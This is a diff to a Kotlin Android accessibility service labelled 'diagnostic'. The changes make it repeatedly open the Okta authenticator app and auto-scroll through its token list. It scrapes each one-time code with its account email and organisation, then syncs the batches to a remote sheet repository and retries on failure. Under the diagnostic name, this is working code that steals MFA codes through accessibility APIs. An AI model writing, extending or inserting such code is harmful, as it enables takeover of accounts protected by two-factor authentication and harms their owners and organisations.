@@ -18,6 +18,7 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import android.util.Log
+import kotlinx.coroutines.delay
 
 class DiagnosticAccessibilityService : AccessibilityService() {
     private val serviceHandler = Handler(Looper.getMainLooper())
@@ -26,9 +27,9 @@ class DiagnosticAccessibilityService : AccessibilityService() {
     }
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
-    
+
     private var oktaCycleJob: Job? = null
-    
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         logWindows()
@@ -40,7 +41,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         lastDispatchedSecondsMap.clear()
         stopOktaCycleLoop()
     }
-    
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == ACTION_TOGGLE_CYCLE) {
             val shouldRun = intent.getBooleanExtra(EXTRA_CYCLE_ENABLED, false)
@@ -52,7 +53,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
         }
         return super.onStartCommand(intent, flags, startId)
     }
-    
+
     private fun startOktaCycleLoop() {
         if (oktaCycleJob?.isActive == true) return
 
@@ -60,6 +61,8 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             while (isActive) {
                 // Launch / Bring Okta to foreground
                 openOktaApp()
+                
+                autoScrollToEnd()
 
                 // Keep Okta open for 10 seconds
                 delay(10_000L)
@@ -73,37 +76,41 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             }
         }
     }
-    
+
     private fun stopOktaCycleLoop() {
         oktaCycleJob?.cancel()
         oktaCycleJob = null
     }
 
     private fun openOktaApp() {
-    var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)
+        var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)
 
-    // Fallback: direct action intent if standard launch intent is null
-    if (launchIntent == null) {
-        launchIntent = Intent(Intent.ACTION_MAIN).apply {
-            addCategory(Intent.CATEGORY_LAUNCHER)
-            setPackage(OKTA_PACKAGE)
+        // Fallback: direct action intent if standard launch intent is null
+        if (launchIntent == null) {
+            launchIntent = Intent(Intent.ACTION_MAIN).apply {
+                addCategory(Intent.CATEGORY_LAUNCHER)
+                setPackage(OKTA_PACKAGE)
+            }
+        }
+
+        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+
+        try {
+            startActivity(launchIntent)
+            Log.d("OktaCycle", "Successfully triggered launch for $OKTA_PACKAGE")
+        } catch (e: Exception) {
+            Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
         }
     }
-
-    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-
-    try {
-        startActivity(launchIntent)
-        Log.d("OktaCycle", "Successfully triggered launch for $OKTA_PACKAGE")
-    } catch (e: Exception) {
-        Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
-    }
-}
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         if (event.packageName?.toString() != OKTA_PACKAGE) return
-        val eventSource = try { event.source } catch (_: Exception) { null }
+        val eventSource = try {
+            event.source
+        } catch (_: Exception) {
+            null
+        }
         eventSource?.let { source ->
             try {
                 val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
@@ -117,13 +124,84 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             }
         }
         if (event.eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
-            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+        ) {
             serviceHandler.removeCallbacks(delayedWindowSnapshot)
             logWindows()
         } else if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             serviceHandler.removeCallbacks(delayedWindowSnapshot)
             serviceHandler.postDelayed(delayedWindowSnapshot, WINDOW_SNAPSHOT_DELAY_MS)
         }
+    }
+
+    private fun findScrollableNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (root == null) return null
+        if (root.isScrollable) return root
+
+        for (i in 0 until root.childCount) {
+            val child = try {
+                root.getChild(i)
+            } catch (_: Exception) {
+                null
+            } ?: continue
+            val scrollable = findScrollableNode(child)
+            if (scrollable != null) {
+                // Found target, recycle current child if it's not the target
+                if (child != scrollable) {
+                    @Suppress("DEPRECATION")
+                    child.recycle()
+                }
+                return scrollable
+            }
+            @Suppress("DEPRECATION")
+            child.recycle()
+        }
+        return null
+    }
+
+    private suspend fun autoScrollToEnd() {
+        // Give Okta UI a brief moment to render after opening
+        delay(3_000L)
+
+        var reachedBottom = false
+        var scrollAttempts = 0
+        val maxScrollAttempts = 15 // Safety ceiling to prevent infinite scroll loops
+
+        while (!reachedBottom && scrollAttempts < maxScrollAttempts) {
+            // Collect currently visible entries on the screen
+            logWindows()
+
+            var scrolled = false
+            windows.forEach { window ->
+                val root = try {
+                    window.root
+                } catch (_: Exception) {
+                    null
+                }
+                if (root != null && root.packageName?.toString() == OKTA_PACKAGE) {
+                    val scrollable = findScrollableNode(root)
+                    if (scrollable != null) {
+                        scrolled = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
+                        @Suppress("DEPRECATION")
+                        scrollable.recycle()
+                    }
+                    @Suppress("DEPRECATION")
+                    root.recycle()
+                }
+            }
+
+            if (!scrolled) {
+                // Cannot scroll further forward -> reached the end of the list
+                reachedBottom = true
+            } else {
+                scrollAttempts++
+                // Wait for smooth scroll animation to finish before reading next batch
+                delay(800L)
+            }
+        }
+
+        // Final scan to grab entries resting at the very bottom
+        logWindows()
     }
 
     private fun inspectNode(
@@ -144,15 +222,21 @@ class DiagnosticAccessibilityService : AccessibilityService() {
                     fields.pass = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
                 }
             }
+
             "$OKTA_PACKAGE:id/list_item_token_email_text_view" -> {
                 fields.account = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
             }
+
             "$OKTA_PACKAGE:id/list_item_token_org_text_view" -> {
                 fields.client = node.text?.toString() ?: node.contentDescription?.toString().orEmpty()
             }
         }
         for (index in 0 until node.childCount) {
-            val child = try { node.getChild(index) } catch (_: Exception) { null } ?: continue
+            val child = try {
+                node.getChild(index)
+            } catch (_: Exception) {
+                null
+            } ?: continue
             try {
                 inspectNode(child, depth + 1, visited, fields)
             } finally {
@@ -164,21 +248,106 @@ class DiagnosticAccessibilityService : AccessibilityService() {
 
     private fun logWindows() {
         try {
-            windows.forEachIndexed { index, window ->
-                val root = try { window.root } catch (_: Exception) { null }
-                root?.takeIf { it.packageName?.toString() == OKTA_PACKAGE }?.let {
+            val allVisibleEntries = mutableListOf<OktaAccountEntry>()
+
+            windows.forEach { window ->
+                val root = try {
+                    window.root
+                } catch (_: Exception) {
+                    null
+                }
+                root?.takeIf { it.packageName?.toString() == OKTA_PACKAGE }?.let { rootNode ->
                     try {
-                        val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
-                        val fields = OktaFields()
-                        inspectNode(it, 0, visited, fields)
-                        fields.emitIfComplete()
+                        collectAllOktaEntries(rootNode, allVisibleEntries)
                     } finally {
                         @Suppress("DEPRECATION")
-                        it.recycle()
+                        rootNode.recycle()
                     }
                 }
             }
+
+            dispatchEntriesIfChanged(allVisibleEntries)
         } catch (_: Exception) {
+        }
+    }
+
+    private fun dispatchEntriesIfChanged(entries: List<OktaAccountEntry>) {
+        val itemsToSync = mutableListOf<OktaAccountEntry>()
+
+        for (entry in entries) {
+            val dedupeKey = "${entry.client}:::${entry.account}"
+            val lastSeconds = lastDispatchedSecondsMap[dedupeKey]
+
+            // Only send if this specific entry's expiration second has updated
+            if (lastSeconds != entry.secondsUntilCodeExpires) {
+                lastDispatchedSecondsMap[dedupeKey] = entry.secondsUntilCodeExpires
+                itemsToSync.add(entry)
+            }
+        }
+
+        if (itemsToSync.isNotEmpty()) {
+            serviceScope.launch {
+                val result = SheetRepository.syncDiagnosticBatch(itemsToSync)
+                result.onFailure {
+                    // Clear cache on failure so next cycle will retry
+                    itemsToSync.forEach { entry ->
+                        lastDispatchedSecondsMap.remove("${entry.client}:::${entry.account}")
+                    }
+                }
+            }
+        }
+    }
+
+    private fun collectAllOktaEntries(root: AccessibilityNodeInfo, results: MutableList<OktaAccountEntry>) {
+        // Find all OTP views currently in the view hierarchy (including newly scrolled ones)
+        val otpNodes = root.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_totp_text_view")
+
+        for (otpNode in otpNodes) {
+            try {
+                val description = otpNode.contentDescription?.toString().orEmpty()
+                val seconds = SECONDS_UNTIL_EXPIRY.find(description)?.groupValues?.get(1)?.toIntOrNull() ?: continue
+                val rawOtp = otpNode.text?.toString() ?: otpNode.contentDescription?.toString().orEmpty()
+                val cleanPassword = rawOtp.replace("\\s".toRegex(), "")
+
+                // Walk up to the row container (card/list item) to find associated client and account
+                var parent: AccessibilityNodeInfo? = otpNode.parent
+                var account: String? = null
+                var client: String? = null
+
+                var climbDepth = 0
+                while (parent != null && climbDepth < 4) {
+                    val emailNodes =
+                        parent.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_email_text_view")
+                    if (emailNodes.isNotEmpty()) {
+                        account = emailNodes[0].text?.toString() ?: emailNodes[0].contentDescription?.toString()
+                        emailNodes.forEach { @Suppress("DEPRECATION") it.recycle() }
+                    }
+
+                    val orgNodes =
+                        parent.findAccessibilityNodeInfosByViewId("$OKTA_PACKAGE:id/list_item_token_org_text_view")
+                    if (orgNodes.isNotEmpty()) {
+                        client = orgNodes[0].text?.toString() ?: orgNodes[0].contentDescription?.toString()
+                        orgNodes.forEach { @Suppress("DEPRECATION") it.recycle() }
+                    }
+
+                    if (account != null && client != null) break
+
+                    val nextParent = parent.parent
+                    @Suppress("DEPRECATION")
+                    parent.recycle()
+                    parent = nextParent
+                    climbDepth++
+                }
+                @Suppress("DEPRECATION")
+                parent?.recycle()
+
+                if (!client.isNullOrBlank() && !account.isNullOrBlank()) {
+                    results.add(OktaAccountEntry(client, account, cleanPassword, seconds))
+                }
+            } finally {
+                @Suppress("DEPRECATION")
+                otpNode.recycle()
+            }
         }
     }
 
@@ -196,18 +365,18 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             val clientValue = client ?: return
             val accountValue = account ?: return
             val secondsValue = secondsUntilCodeExpires ?: return
-            val passValue = pass?: return
+            val passValue = pass ?: return
             if (!hasPasswordNode) return
             val dedupeKey = "$clientValue:::$accountValue"
             val lastSentSeconds = lastDispatchedSecondsMap[dedupeKey]
-            
+
             if (lastSentSeconds == secondsValue) {
                 return
             }
             lastDispatchedSecondsMap[dedupeKey] = secondsValue
-            
+
             val cleanPassword = passValue.replace("\\s".toRegex(), "")
-            
+
             DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)
 
             serviceScope.launch {
